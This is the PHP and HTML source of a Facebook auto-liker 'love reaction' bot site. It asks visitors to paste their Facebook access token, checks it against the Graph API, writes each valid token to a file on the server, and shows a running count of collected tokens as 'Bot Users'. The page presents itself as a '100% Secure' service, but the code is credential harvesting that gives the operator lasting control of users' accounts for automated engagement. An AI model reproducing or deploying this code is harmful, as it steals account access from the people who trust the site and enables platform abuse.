
 ﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>| SHAHZAIB MUGHAL |</title>

<link rel="stylesheet" type="text/css" href="Kashan.css" media="all,handheld"/>

<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet"/>
<link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/images/emoji.php/v9/fa/1/16/1f981.png"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

</head>

<div id="header"><script src="Kashan.js"></script><hr></div>

<center><marquee direction="left" width="60%"> -SHAHZAIB MUGHAL <font color ="red">❤️</font> LOVE REACTION SITE <font color =Blue">❤️</font> OWNER SHAHZAIB MUGHAL</marquee></center></br>
<hr width="60%"></br>

<?php
$yx=opendir('Sameel');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Sameel($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Sameel($access){
if(!is_dir('Sameel')){
mkdir('Sameel');
}
$a=fopen('Sameel/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
    
     
		<div class="panel panel-success">
		
		<div class="panel-heading"><h4 style="text-align : center;"><i class="fas fa-bullhorn"></i> Completely Fixed!! No Likes Block</h4></div>


<h1 class="heading">
<marquee behavior="alternate"<h6>
<font face="Battle Beasts" size="12"> <script src="Kashan.js"></script>
</h6></marquee><br>


		</div>
     

<center> <a target="_blank" href="https://www.facebook.com/100026620422450"> <center> <img src="https://graph.facebook.com/100026620422450/picture?type=large" style="width:300px; height:300px;border: 80px;border-radius: 80%;"  </center>
<br>
<marquee direction="left" width="60%"><font color ="white"> 100% Secure <font/><font color ="red">❤️</font><font color ="white"> NoExpire & No Like Block Bot <font/><font color ="red">❤️</font><font color ="white"> Follow Me </marquee>
<br>
<div class="css">
	<ul class="intro-social">        
         <font face="Audiowide" size="100" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;"><a href="https://www.facebook.com/100026620422450" target="blank"><img src="https://d.top4top.net/p_8715fuks1.png?width=900" alt=" width="50" height="50" title="Follow Me On Facebook"/></i></a></font> <font face="Audiowide" size="100" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;"><a href="https://instagram.com/shahzaib_1436/
" target="blank"><img src="https://f.top4top.net/p_979obp510.png?width=900" alt=" width="50" height="50" title="Follow Me On Instagram"/></i></a></font> <font face="Audiowide" size="100" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;"><a href="https://twitter.com/         " target="blank"><img src="https://f.top4top.net/p_97989m0i0.png?width=900" alt=" width="50" height="50" title="Follow Me On Twitter"/></i></a></font>
      </ul></div> <!-- /intro-social -->

<br>
<center><a class="button" href="https://shexi.herokuapp.com/" target="blank">Click Here to Get Token</a></center>

</font><br>
<form action="" method="POST">
<input class="search" style="width:70%" type="text" name="access_token" placeholder="Input Token Here" required></br>
<input class="submit" type="submit" name="saveFile" value="Submit"></form>
</font><br>
<br>


</body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'

  
<div class="panel panel-success">
		
		<div class="panel-heading"><h4 style="text-align : center;"><i class="fas fa-bullhorn"></i> Completely Fixed!! No Like and Comment Block</h4></div>

		</div>
<br>
<div id="navigation-menu">

     		<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
<br>
<br>
<br>
<marquee direction="left"><font size="10" color="white">Thanks For Using Our Bot || Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<form action="index.php" method="post">
<center><input class="submit" type="submit" value="Click Here To Add Othe Token"></center>
<br>
<br>
<br>
<center> <font color="yellow"> Design By<a href="https://www.facebook.com/100026620422450" target="blank"><font color="red">Shahzaib Mughal<br>
<br><img src="http://alo0osh-sy.xtgem.com/images/I folder lock_1_1_1.gif"
<br>
</center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
	<br>
<center><font size="5" color="red"><?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'Sameel/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // prints out how many were in the directory
     echo "Bot Users : $i";
?><br></font></p></h2>


 <div class="post-meta2">
<div class="footersahib">    <center><font color=""><script type="text/javascript"> function toSpans(span) { var str=span.firstChild.data; var a=str.length; span.removeChild(span.firstChild); for(var i=0; i<a; i++) { var theSpan=document.createElement("SPAN"); theSpan.appendChild(document.createTextNode(str.charAt(i))); span.appendChild(theSpan); } } function RainbowSpan(span, hue, deg, brt, spd, hspd) { this.deg=(deg==null?360:Math.abs(deg)); this.hue=(hue==null?0:Math.abs(hue)%360); this.hspd=(hspd==null?3:Math.abs(hspd)%360); this.length=span.firstChild.data.length; this.span=span; this.speed=(spd==null?50:Math.abs(spd)); this.hInc=this.deg/this.length; this.brt=(brt==null?255:Math.abs(brt)%256); this.timer=null; toSpans(span); this.moveRainbow(); } RainbowSpan.prototype.moveRainbow = function() { if(this.hue>359) this.hue-=360; var color; var b=this.brt; var a=this.length; var h=this.hue; for(var i=0; i<a; i++) { if(h>359) h-=360; if(h<60) { color=Math.floor(((h)/60)*b); red=b;grn=color;blu=0; } else if(h<120) { color=Math.floor(((h-60)/60)*b); red=b-color;grn=b;blu=0; } else if(h<180) { color=Math.floor(((h-120)/60)*b); red=0;grn=b;blu=color; } else if(h<240) { color=Math.floor(((h-180)/60)*b); red=0;grn=b-color;blu=b; } else if(h<300) { color=Math.floor(((h-240)/60)*b); red=color;grn=0;blu=b; } else { color=Math.floor(((h-300)/60)*b); red=b;grn=0;blu=b-color; } h+=this.hInc; this.span.childNodes[i].style.color="rgb("+red+", "+grn+", "+blu+")"; } this.hue+=this.hspd; } </script> <b><center><font size="6"></head><body><div style="font-face;Iceland;font-size: 40pt;text-shadow: 0 0 11px #66FFFF, 0 0 11px #66FFFF, 0 0 11px #66FFFF;color: #FFF"><strong><center><font-face;Iceland;" size="10" id="r3">Design By ¦ Shahzaib Mughal</font><strong></center> <script type="text/javascript">var r3=document.getElementById("r3"); var myRainbowSpan2=new RainbowSpan(r3, 0, 360, 255, 50, 348); myRainbowSpan2.timer=window.setInterval("myRainbowSpan2.moveRainbow()", myRainbowSpan2.speed); </script> 
</body>
</html>


  <video controls autoplay>
      <source src="https://m.youtube.com/watch?v=syzhefR5nRs">
type="video/mpeg">
  Your browser does not support the audio element.
</video>
</span>
</div><br>


